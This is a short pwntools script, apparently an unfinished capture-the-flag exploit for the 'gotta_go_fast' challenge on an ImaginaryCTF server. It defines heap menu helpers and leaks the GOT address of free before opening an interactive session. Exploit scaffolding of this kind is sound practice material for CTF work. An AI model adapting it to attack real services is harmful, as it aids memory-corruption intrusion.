#!/usr/bin/env python3

from pwn import *

exe = ELF("./gotta_go_fast_patched")

context.binary = exe



def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("chal.imaginaryctf.org", 42009)

def s(data):
    r.sendlineafter("> ", data)

def alloc(name):
    s("0")
    s("1")
    s("1")
    r.recvline()
    r.sendline(name)

def free(index):
    s("1")
    s(str(index))

def leak(mem):
    s("4")
    r.recvline()
    r.sendline(str(mem))
    return int(r.recvline().strip(), 16)

def show():
    s("2")

def main():
    
    
    HEAD = leak(exe.got['free'])
    log.warn("leak (@ 0x%x", HEAD)
    

    r.interactive()


if __name__ == "__main__":
    main()
